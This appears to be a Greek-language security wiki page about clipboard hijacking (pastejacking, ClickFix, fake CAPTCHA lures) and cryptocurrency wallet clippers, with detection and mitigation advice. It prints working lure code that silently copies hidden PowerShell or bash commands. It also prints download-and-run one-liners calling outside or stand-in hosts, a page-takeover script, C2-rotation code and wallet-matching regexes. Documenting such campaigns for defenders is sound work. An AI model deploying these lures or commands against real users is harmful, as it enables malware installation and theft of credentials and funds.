# Επιθέσεις Clipboard Hijacking (Pastejacking)

> «Μην κάνεις ποτέ paste σε κάτι που δεν αντέγραψες ο ίδιος.» – παλιά, αλλά ακόμη έγκυρη συμβουλή

## Επισκόπηση

Το Clipboard hijacking – γνωστό και ως *pastejacking* – εκμεταλλεύεται το γεγονός ότι οι χρήστες κάνουν συχνά αντιγραφή και επικόλληση εντολών χωρίς να τις ελέγχουν. Μια κακόβουλη web page (ή οποιοδήποτε context με δυνατότητα JavaScript, όπως μια εφαρμογή Electron ή Desktop) τοποθετεί προγραμματιστικά κείμενο που ελέγχεται από τον attacker στο system clipboard. Τα θύματα παροτρύνονται, συνήθως μέσω προσεκτικά σχεδιασμένων οδηγιών social engineering, να πατήσουν **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell) ή να ανοίξουν ένα terminal και να κάνουν *paste* το περιεχόμενο του clipboard, εκτελώντας αμέσως arbitrary commands.

Επειδή **δεν γίνεται download κάποιου file και δεν ανοίγει κάποιο attachment**, η τεχνική παρακάμπτει τα περισσότερα security controls του e-mail και του web content που παρακολουθούν attachments, macros ή direct command execution. Επομένως, η επίθεση είναι δημοφιλής σε phishing campaigns που διανέμουν commodity malware families όπως τα NetSupport RAT, Latrodectus loader ή Lumma Stealer.<sup>[[1]](#references)</sup>

## Wallet-address replacement clippers

Μια άλλη παραλλαγή του **clipboard hijacking** δεν κάνει paste commands: περιμένει μέχρι το θύμα να αντιγράψει μια **cryptocurrency wallet address** και στη συνέχεια την αντικαθιστά αθόρυβα με μια address που ελέγχεται από τον attacker, ακριβώς πριν από το paste. Αυτό είναι ιδιαίτερα αποτελεσματικό σε wallet formats μεγάλου μήκους, επειδή οι χρήστες συχνά ελέγχουν μόνο τους πρώτους και τους τελευταίους χαρακτήρες.<sup>[[8]](#references)</sup>

Συνηθισμένα χαρακτηριστικά στην πράξη:
- **Thin loader + nested payload**: το ορατό app/exe φαίνεται σαν legitimate trading ή "profit" tool, ενώ το πραγματικό clipper είναι κρυμμένο βαθύτερα στο bundle (για παράδειγμα, ένας .NET loader εκκινεί ένα nested Rust payload).
- **Regex-driven replacement**: το malware κάνει match σε strings όπως `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...` ή ακόμη και σε generic **44-character Solana-like** strings και τα αντικαθιστά με attacker wallets.
- **Wallet rotation at scale**: σύγχρονα Windows samples μπορεί να περιέχουν **χιλιάδες** replacement wallets ανά currency αντί για μία static address, μειώνοντας το wallet reputation burn μετά από κάθε theft.<sup>[[8]](#references)</sup>

### Windows clipper flow

Μια συνηθισμένη υλοποίηση είναι ένα hidden window που έχει γίνει register με **`AddClipboardFormatListener`**. Σε κάθε clipboard update, το malware συνήθως καλεί:<sup>[[8]](#references)</sup>
- **`OpenClipboard`** → πρόσβαση στα τρέχοντα clipboard data.
- **`GetClipboardData`** → ανάγνωση του text.
- **`EmptyClipboard`** + **`SetClipboardData`** → αντικατάσταση του wallet string με την attacker value.

Minimal hunting regexes που συναντώνται συχνά σε clippers:
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
Η persistence σε επίπεδο χρήστη αρκεί για την επίτευξη impact. Ένα παρατηρημένο μοτίβο είναι:<sup>[[8]](#references)</sup>
- Αντιγραφή του payload στο **`%APPDATA%\silke\silke.exe`**
- Δημιουργία ενός **Startup-folder LNK** στο `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`

Ιδέες για detection:
- Processes που καλούν συνεχώς clipboard APIs και ταυτόχρονα γράφουν στο `%APPDATA%` και στον φάκελο **Startup** του χρήστη.
- Δημιουργία νέου LNK/executable, ακολουθούμενη από rewrites διευθύνσεων wallet στο clipboard.
- Archives ή fake-software bundles που περιέχουν πολλά αχρησιμοποίητα αρχεία και έναν μικρό launcher που εκκινεί ένα nested binary.

### Social-engineered αφαίρεση quarantine + LaunchAgent persistence σε macOS

Σε macOS, ορισμένες campaigns διανέμουν έναν helper **`unlocker.command`** και instruρούν το θύμα να κάνει δεξί κλικ → **Open**, αν το Gatekeeper αναφέρει ότι η εφαρμογή είναι κατεστραμμένη ή προέρχεται από unidentified developer. Το script απλώς αφαιρεί το quarantine και εκκινεί το κοντινό `.app`:<sup>[[8]](#references)</sup>
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
Αυτό **δεν** είναι exploit του Gatekeeper· είναι ένα **social-engineered quarantine bypass** που εκμεταλλεύεται το γεγονός ότι οι αποφάσεις του Gatekeeper εξαρτώνται από το `com.apple.quarantine` xattr.<sup>[[8]](#references)</sup>

Μετά την εκτέλεση, το clipper μπορεί να παραμείνει persistent ως ο τρέχων χρήστης γράφοντας:<sup>[[8]](#references)</sup>
- **`~/launch.sh`** – wrapper script
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent με `RunAtLoad` και `KeepAlive`

Μια χρήσιμη αμυντική λεπτομέρεια είναι ότι ορισμένα samples υλοποιούν ένα **self-healing watchdog** που επανεγγράφει το LaunchAgent και το wrapper περίπου κάθε 30 δευτερόλεπτα. Αν αφαιρέσετε πρώτα το plist **χωρίς να τερματίσετε τη running process**, το malware μπορεί να το δημιουργήσει ξανά αμέσως.<sup>[[8]](#references)</sup> Ασφαλής σειρά cleanup:
1. Τερματίστε τη running clipper process.
2. Κάντε unload/διαγράψτε το LaunchAgent plist.
3. Διαγράψτε τα `~/launch.sh` και το copied payload.

### Σημείωση διανομής: fake reputation ως force multiplier

Για αυτή την οικογένεια, το ίδιο το malware μπορεί να παραμένει τεχνικά απλό, ενώ το **distribution layer** αναλαμβάνει το μεγαλύτερο μέρος της δουλειάς: fake GitHub stars/forks, SourceForge reviews/downloads, YouTube tutorial comments/views και benign-looking VirusTotal comments/votes χρησιμοποιούνται ώστε το binary να φαίνεται αξιόπιστο πριν από την εκτέλεση.<sup>[[8]](#references)</sup>

## Forced copy buttons και hidden payloads (macOS one-liners)

Ορισμένα macOS infostealers κλωνοποιούν installer sites (π.χ. το Homebrew) και **επιβάλλουν τη χρήση ενός κουμπιού “Copy”**, ώστε οι χρήστες να μην μπορούν να επιλέξουν μόνο το ορατό κείμενο. Η καταχώριση στο clipboard περιέχει την αναμενόμενη εντολή εγκατάστασης μαζί με ένα προσαρτημένο Base64 payload (π.χ. `...; echo <b64> | base64 -d | sh`), επομένως ένα μόνο paste εκτελεί και τα δύο, ενώ το UI αποκρύπτει το επιπλέον stage.<sup>[[5]](#references)</sup>

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Οι παλαιότερες καμπάνιες χρησιμοποιούσαν `document.execCommand('copy')`, ενώ οι νεότερες βασίζονται στο ασύγχρονο **Clipboard API** (`navigator.clipboard.writeText`).<sup>[[2]](#references)</sup>

## Η ροή ClickFix / ClearFake

1. Ο χρήστης επισκέπτεται έναν ιστότοπο με typosquatting ή έναν παραβιασμένο ιστότοπο (π.χ. `docusign.sa[.]com`)
2. Η injected **ClearFake** JavaScript καλεί ένα helper `unsecuredCopyToClipboard()` που αποθηκεύει αθόρυβα στο clipboard ένα Base64-encoded PowerShell one-liner.
3. Οι οδηγίες HTML αναφέρουν στο θύμα: *«Πατήστε **Win + R**, κάντε paste την εντολή και πατήστε Enter για να επιλύσετε το πρόβλημα.»*
4. Το `powershell.exe` εκτελείται και κατεβάζει ένα archive που περιέχει ένα legitimate executable μαζί με ένα malicious DLL (κλασικό DLL sideloading).
5. Ο loader αποκρυπτογραφεί επιπλέον stages, κάνει inject shellcode και εγκαθιστά persistence (π.χ. scheduled task) – εκτελώντας τελικά NetSupport RAT / Latrodectus / Lumma Stealer.<sup>[[1]](#references)</sup>

### Παράδειγμα αλυσίδας NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* Το `jp2launcher.exe` (legitimate Java WebStart) αναζητά στον κατάλογό του το `msvcp140.dll`.
* Το malicious DLL επιλύει δυναμικά APIs με **GetProcAddress**, κατεβάζει δύο binaries (`data_3.bin`, `data_4.bin`) μέσω του **curl.exe**, τα αποκρυπτογραφεί χρησιμοποιώντας ένα rolling XOR key `"https://google.com/"`, κάνει inject το τελικό shellcode και αποσυμπιέζει το **client32.exe** (NetSupport RAT) στο `C:\ProgramData\SecurityCheck_v1\`.<sup>[[1]](#references)</sup>

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Κατεβάζει το `la.txt` με το **curl.exe**
2. Εκτελεί τον JScript downloader μέσα στο **cscript.exe**
3. Λαμβάνει ένα MSI payload → αποθηκεύει το `libcef.dll` δίπλα σε μια signed application → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>

### Lumma Stealer μέσω MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
Η κλήση **mshta** εκκινεί ένα κρυφό script PowerShell που λαμβάνει το `PartyContinued.exe`, εξάγει το `Boat.pst` (CAB), ανακατασκευάζει το `AutoIt3.exe` μέσω των `extrac32` και concatenation αρχείων και, τέλος, εκτελεί ένα script `.a3x` που κάνει exfiltration των διαπιστευτηρίων browser στο `sumeriavgv.digital`.<sup>[[1]](#references)</sup>

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Ορισμένες καμπάνιες ClickFix παραλείπουν εντελώς τα file downloads και καθοδηγούν τα θύματα να κάνουν paste ένα one-liner που λαμβάνει και εκτελεί JavaScript μέσω WSH, εγκαθιστά persistence και περιστρέφει το C2 καθημερινά. Παράδειγμα ακολουθίας που παρατηρήθηκε:<sup>[[3]](#references)</sup>
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Βασικά χαρακτηριστικά
- Obfuscated URL αντιστρέφεται κατά το runtime για να αποτρέπει την επιφανειακή επιθεώρηση.
- Το JavaScript διατηρείται μέσω ενός Startup LNK (WScript/CScript) και επιλέγει το C2 με βάση την τρέχουσα ημέρα, επιτρέποντας την ταχεία εναλλαγή domains.<sup>[[3]](#references)</sup>

Ελάχιστο απόσπασμα JS που χρησιμοποιείται για την εναλλαγή των C2s ανά ημερομηνία:<sup>[[3]](#references)</sup>
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Το επόμενο στάδιο συνήθως αναπτύσσει έναν loader που εγκαθιστά persistence και πραγματοποιεί λήψη ενός RAT (π.χ. PureHVNC), συχνά χρησιμοποιώντας certificate pinning TLS σε hardcoded certificate και τεμαχίζοντας την κίνηση.<sup>[[3]](#references)</sup>

Ιδέες ανίχνευσης ειδικά για αυτήν την παραλλαγή
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (ή `cscript.exe`).
- Startup artifacts: LNK στο `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` που καλεί WScript/CScript με JS path κάτω από `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU και command-line telemetry που περιέχουν `.split('').reverse().join('')` ή `eval(a.responseText)`.
- Επαναλαμβανόμενα `powershell -NoProfile -NonInteractive -Command -` με μεγάλα stdin payloads για την τροφοδότηση long scripts χωρίς long command lines.
- Scheduled Tasks που στη συνέχεια εκτελούν LOLBins όπως `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` κάτω από task/path που μοιάζει με updater (π.χ. `\GoogleSystem\GoogleUpdater`).

Threat hunting
- C2 hostnames και URLs που αλλάζουν καθημερινά, με pattern `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Συσχετίστε clipboard write events που ακολουθούνται από επικόλληση μέσω Win+R και άμεση εκτέλεση του `powershell.exe`.

Οι Blue-teams μπορούν να συνδυάσουν clipboard, process-creation και registry telemetry για να εντοπίσουν κατάχρηση pastejacking:

* Windows Registry: Το `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` διατηρεί ιστορικό εντολών **Win + R** – αναζητήστε ασυνήθιστες Base64 / obfuscated καταχωρίσεις.
* Security Event ID **4688** (Process Creation), όπου `ParentImage` == `explorer.exe` και `NewProcessName` ανήκει στο { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** για δημιουργία αρχείων κάτω από `%LocalAppData%\Microsoft\Windows\WinX\` ή σε temporary folders ακριβώς πριν από το ύποπτο event 4688.
* EDR clipboard sensors (εάν υπάρχουν) – συσχετίστε `Clipboard Write` που ακολουθείται άμεσα από ένα νέο PowerShell process.

## Σελίδες επαλήθευσης τύπου IUAM (ClickFix Generator): αντιγραφή clipboard-to-console + OS-aware payloads

Πρόσφατες καμπάνιες παράγουν μαζικά πλαστές σελίδες επαλήθευσης CDN/browser ("Just a moment…", τύπου IUAM), οι οποίες εξαναγκάζουν τους χρήστες να αντιγράφουν OS-specific commands από το clipboard σε native consoles. Αυτό μεταφέρει την εκτέλεση εκτός του browser sandbox και λειτουργεί σε Windows και macOS.<sup>[[4]](#references)</sup>

Βασικά χαρακτηριστικά των σελίδων που δημιουργούνται από τον builder
- OS detection μέσω `navigator.userAgent` για την προσαρμογή των payloads (Windows PowerShell/CMD έναντι macOS Terminal). Προαιρετικά decoys/no-ops για unsupported OS, ώστε να διατηρείται η ψευδαίσθηση.
- Αυτόματη αντιγραφή στο clipboard κατά τη διάρκεια benign ενεργειών UI (checkbox/Copy), ενώ το ορατό κείμενο μπορεί να διαφέρει από το περιεχόμενο του clipboard.
- Αποκλεισμός mobile και popover με step-by-step instructions: Windows → Win+R→paste→Enter· macOS → άνοιγμα Terminal→paste→Enter.
- Προαιρετικό obfuscation και single-file injector για την αντικατάσταση του DOM ενός compromised site με verification UI σε στυλ Tailwind (χωρίς να απαιτείται νέα domain registration).<sup>[[4]](#references)</sup>

Παράδειγμα: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS persistence της αρχικής εκτέλεσης
- Χρησιμοποίησε `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` ώστε η εκτέλεση να συνεχίζεται μετά το κλείσιμο του terminal, μειώνοντας τα ορατά artifacts.<sup>[[4]](#references)</sup>

Ανάληψη σελίδας εντός της ίδιας θέσης σε compromised sites
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Ιδέες για detection & hunting ειδικά για lures τύπου IUAM
- Web: Σελίδες που συνδέουν το Clipboard API με widgets επαλήθευσης· ασυμφωνία μεταξύ του εμφανιζόμενου κειμένου και του payload του clipboard· διακλάδωση βάσει του `navigator.userAgent`· Tailwind + αντικατάσταση single-page σε ύποπτα contexts.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` λίγο μετά από αλληλεπίδραση με browser· batch/MSI installers που εκτελούνται από το `%TEMP%`.
- macOS endpoint: Το Terminal/iTerm δημιουργεί διεργασίες `bash`/`curl`/`base64 -d` με `nohup` κοντά σε browser events· background jobs που επιβιώνουν από το κλείσιμο του terminal.
- Συσχετίστε το ιστορικό `RunMRU` του Win+R και τις εγγραφές στο clipboard με την επακόλουθη δημιουργία console processes.

Δείτε επίσης για υποστηρικτικές τεχνικές

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Εξελίξεις του 2026 σε fake CAPTCHA / ClickFix (ClearFake, Scarlet Goldfinch)

- Το ClearFake συνεχίζει να παραβιάζει WordPress sites και να εισάγει loader JavaScript που συνδέει αλυσιδωτά εξωτερικούς hosts (Cloudflare Workers, GitHub/jsDelivr) και ακόμη και κλήσεις blockchain «etherhiding» (π.χ. POSTs σε Binance Smart Chain API endpoints όπως το `bsc-testnet.drpc[.]org`) για να ανακτά την τρέχουσα λογική του lure. Τα πρόσφατα overlays χρησιμοποιούν σε μεγάλο βαθμό fake CAPTCHAs που instruct τους χρήστες να κάνουν copy/paste ένα one-liner (T1204.004), αντί να κατεβάσουν οτιδήποτε.<sup>[[6]](#references)</sup>
- Η αρχική εκτέλεση ανατίθεται ολοένα και περισσότερο σε signed script hosts/LOLBAS. Οι αλυσίδες του Ιανουαρίου 2026 αντικατέστησαν την προηγούμενη χρήση του `mshta` με το ενσωματωμένο `SyncAppvPublishingServer.vbs`, το οποίο εκτελείται μέσω του `WScript.exe` και λαμβάνει ορίσματα τύπου PowerShell με aliases/wildcards για την ανάκτηση απομακρυσμένου περιεχομένου:<sup>[[6]](#references)</sup>
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- Το `SyncAppvPublishingServer.vbs` είναι υπογεγραμμένο και χρησιμοποιείται κανονικά από το App-V· σε συνδυασμό με το `WScript.exe` και ασυνήθιστα ορίσματα (aliases `gal`/`gcm`, cmdlets με wildcards, URLs του jsDelivr) μετατρέπεται σε LOLBAS stage υψηλής αξιοπιστίας για το ClearFake.<sup>[[6]](#references)</sup>
- Τον Φεβρουάριο του 2026, τα fake CAPTCHA payloads επέστρεψαν σε pure PowerShell download cradles. Δύο ενεργά παραδείγματα:<sup>[[6]](#references)</sup>
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- Η πρώτη αλυσίδα είναι ένας in-memory `iex(irm ...)` grabber· η δεύτερη χρησιμοποιεί `WinHttp.WinHttpRequest.5.1`, γράφει ένα προσωρινό `.ps1` και στη συνέχεια το εκκινεί με `-ep bypass` σε κρυφό παράθυρο.<sup>[[6]](#references)</sup>

Συμβουλές ανίχνευσης/hunting για αυτές τις παραλλαγές
- Ιεραρχία διεργασιών: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` ή PowerShell cradles αμέσως μετά από εγγραφές στο clipboard/Win+R.
- Λέξεις-κλειδιά στη γραμμή εντολών: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, domains jsDelivr/GitHub/Cloudflare Worker ή μοτίβα raw IP `iex(irm ...)`.
- Δίκτυο: εξερχόμενες συνδέσεις προς CDN worker hosts ή blockchain RPC endpoints από script hosts/PowerShell λίγο μετά την περιήγηση στον ιστό.
- Αρχεία/registry: δημιουργία προσωρινών `.ps1` κάτω από `%TEMP%` μαζί με καταχωρίσεις RunMRU που περιέχουν αυτά τα one-liners· block/alert σε signed-script LOLBAS (WScript/cscript/mshta) που εκτελούνται με external URLs ή obfuscated alias strings.

## Tradecraft του ClickFix τον Ιούνιο 2026: paste telemetry, fake verification comments και LOLBin chaining

Πρόσφατη τηλεμετρία της Red Canary δείχνει ότι ο σταθερός δείκτης **δεν είναι μία ακριβής εντολή**, αλλά ο συνδυασμός **user-assisted paste-and-run**, **trusted interpreters/LOLBins**, **obfuscated flags**, **remote retrieval** και **immediate execution**.<sup>[[7]](#references)</sup>

### Αξιοσημείωτα μοτίβα operators

- **Paste confirmation telemetry**: ορισμένα payloads εκτελούν `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` πριν από το πραγματικό stage. Αυτό επιβεβαιώνει την αλληλεπίδραση του χρήστη, διατηρώντας παράλληλα το παράθυρο σύντομο και αθόρυβο.
- **Fake verification comments**: τα PowerShell one-liners μπορεί να προσθέτουν strings όπως `# Security check ✔️ I'm not a robot Verification ID: 138105`, ώστε η εντολή να εξακολουθεί να φαίνεται σχετική με CAPTCHA αφού επικολληθεί στο Run / `cmd.exe` / στο ιστορικό του PowerShell.
- **Dynamic URL reconstruction**: το `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` αποφεύγει ένα static URL στη γραμμή εντολών, ενώ εξακολουθεί να εκτελεί in-memory download-and-execute.
- **Masqueraded installer execution**: το `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` κάνει abuse σε unusual casing και Unicode-like characters στα flags, ώστε να παρακάμπτει brittle detections ενώ εξακολουθεί να μοιάζει με `msiexec.exe`.
- **Caret-escaped LOLBin chains**: το `cmd.exe` μπορεί να αποκρύπτει keywords με `^` escapes (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), να εκκινεί το nested shell σε minimized κατάσταση, να αποθηκεύει attacker content με ένα benign extension όπως `.pdf` και στη συνέχεια να το εκτελεί μέσω `mshta`.<sup>[[7]](#references)</sup>
## Μετριασμοί

1. Browser hardening – απενεργοποιήστε την clipboard write-access (`dom.events.asyncClipboard.clipboardItem` κ.λπ.) ή απαιτήστε user gesture.
2. Security awareness – διδάξτε στους χρήστες να *πληκτρολογούν* sensitive commands ή να τις επικολλούν πρώτα σε text editor.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control για τον αποκλεισμό arbitrary one-liners.
4. Network controls – αποκλείστε εξερχόμενα requests προς γνωστά pastejacking και malware C2 domains.

## Σχετικά Tricks

* **Discord Invite Hijacking** συχνά κάνει abuse στην ίδια προσέγγιση ClickFix, αφού παρασύρει τους χρήστες σε malicious server:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [1] [Fix το Click: Πρόληψη του ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [2] [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [3] [Check Point Research – Υπό την Pure Curtain: Από RAT σε Builder και Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [4] [Το ClickFix Factory: Πρώτη αποκάλυψη του IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [5] [Το 2025, η χρονιά του Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [6] [Red Canary – Intelligence Insights: Φεβρουάριος 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [7] [Red Canary – Intelligence Insights: Ιούνιος 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [8] [Check Point Research – Από τα Stars στα Upvotes: Fake Reputation που τροφοδοτεί έναν Crypto Clipboard Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)
{{#include ../../banners/hacktricks-training.md}}
